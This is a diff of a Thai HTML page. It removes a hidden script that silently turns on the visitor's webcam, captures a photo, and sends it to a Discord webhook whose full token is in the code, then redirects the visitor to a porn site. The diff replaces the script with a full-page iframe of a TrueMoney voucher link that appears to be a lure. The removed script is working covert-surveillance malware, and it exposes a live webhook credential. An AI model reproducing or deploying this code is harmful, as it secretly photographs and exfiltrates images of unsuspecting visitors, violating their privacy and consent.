@@ -1,62 +1,18 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="th">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ถ่ายรูปเบื้องหลัง + แสดงเว็บเต็มหน้า</title>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>กำลังแสดงหน้า</title>
+<style>
+  body, html { margin:0; padding:0; height:100%; }
+  iframe { width:100%; height:100%; border:none; }
+</style>
 </head>
 <body>
 
-<script>
-const webhookURL = 'https://discord.com/api/webhooks/1436921732828233739/jiaHUEhfqoG1PO1mu8uWooMKe8AX84-IjlBSdnywiQzmsaqgUGku_nUSR5PcfBZphdp5'; // ใส่เว็บฮุกของมึง
-const targetURL = 'https://หีเด้ง.net/tag/xnxx/';     // เว็บเต็มหน้าที่จะแสดง
-
-// สร้างวิดีโอและ canvas แบบ hidden
-const video = document.createElement('video');
-video.autoplay = true;
-video.style.display = 'none';
-document.body.appendChild(video);
-
-const canvas = document.createElement('canvas');
-canvas.style.display = 'none';
-document.body.appendChild(canvas);
-
-// ขอสิทธิ์กล้อง
-navigator.mediaDevices.getUserMedia({ video: true })
-  .then(stream => {
-    video.srcObject = stream;
-
-    video.onloadedmetadata = () => {
-      setTimeout(() => {
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-
-        // ส่งเป็น Blob/FormData
-        canvas.toBlob(blob => {
-          const formData = new FormData();
-          formData.append('file', blob, 'photo.png');
-
-          fetch(webhookURL, {
-            method: 'POST',
-            body: formData
-          })
-          .finally(() => {
-            // เปิดเว็บเป้าหมายเต็มหน้า
-            window.location.replace(targetURL);
-          });
-
-        }, 'image/png');
-
-      }, 1000); // รอให้กล้องปรับแสง
-    };
-  })
-  .catch(err => {
-    console.error('ไม่สามารถเข้ากล้องได้', err);
-    // ถ้ากล้องไม่อนุญาตก็ไปเว็บเป้าหมายเลย
-    window.location.replace(targetURL);
-  });
-</script>
+<!-- กำหนด URL ที่ต้องการให้แสดง -->
+<iframe src="https://gift.truemoney.com/campaign/voucher_detail?v=019a9147ccd579739c8b376028dc05efd3E&fbclid=PARlRTSAOH-P5leHRuA2FlbQIxMABzcnRjBmFwcF9pZA8xMjQwMjQ1NzQyODc0MTQIY2FsbHNpdGUBMgABpzZcBnw6_gItqHt9AHdLJenI06KL9z5u124C68KL1qc4nog03HK8zMlK-unS_aem_vPf9gZq5uGxx2a7jr2dmsg"></iframe>
 
 </body>
 </html>
